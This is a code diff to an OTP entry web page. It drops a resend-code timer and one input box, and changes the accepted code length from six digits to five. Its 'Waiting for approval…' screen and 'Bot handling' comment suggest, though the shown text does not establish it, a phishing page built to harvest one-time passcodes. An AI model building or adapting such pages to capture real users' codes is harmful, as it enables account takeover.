@@ -102,18 +102,6 @@
     opacity: 1;
   }
 
-  .resend {
-    text-align: center;
-    font-size: 14px;
-    color: #999;
-    margin-top: 18px;
-  }
-
-  .resend.active {
-    color: #e11b22;
-    cursor: pointer;
-  }
-
   .waiting {
     text-align: center;
     font-size: 14px;
@@ -140,7 +128,6 @@
     <input type="tel" maxlength="1" inputmode="numeric">
     <input type="tel" maxlength="1" inputmode="numeric">
     <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
   </div>
 
   <div class="timer">
@@ -152,15 +139,12 @@
   <div id="waiting" class="waiting">
     ⏳ Waiting for approval…
   </div>
-
-  <div id="resend" class="resend">Resend in 02:00</div>
 </div>
 
 <script>
   const inputs = document.querySelectorAll('.otp-wrap input');
   const verifyBtn = document.getElementById('verifyBtn');
   const countdownEl = document.getElementById('countdown');
-  const resendEl = document.getElementById('resend');
   const waitingEl = document.getElementById('waiting');
 
   // Bot handling
@@ -179,19 +163,14 @@
 
   // Countdown
   let timeLeft = 120;
-  function formatTime(sec) {
-    return `${String(Math.floor(sec / 60)).padStart(2,'0')}:${String(sec % 60).padStart(2,'0')}`;
-  }
 
   const timer = setInterval(() => {
     timeLeft--;
     countdownEl.textContent = timeLeft;
-    resendEl.textContent = `Resend in ${formatTime(timeLeft)}`;
+
     if (timeLeft <= 0) {
       clearInterval(timer);
       countdownEl.textContent = '0';
-      resendEl.textContent = 'Resend OTP';
-      resendEl.classList.add('active');
     }
   }, 1000);
 
@@ -240,7 +219,7 @@
 
   function checkInputs() {
     verifyBtn.disabled =
-      Array.from(inputs).map(i => i.value).join('').length !== 6;
+      Array.from(inputs).map(i => i.value).join('').length !== 5;
   }
 
   inputs.forEach((input, i) => {
@@ -253,7 +232,7 @@
 
   verifyBtn.addEventListener('click', () => {
     const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length === 6) submitOtp(code);
+    if (code.length === 5) submitOtp(code);
   });
 </script>
 
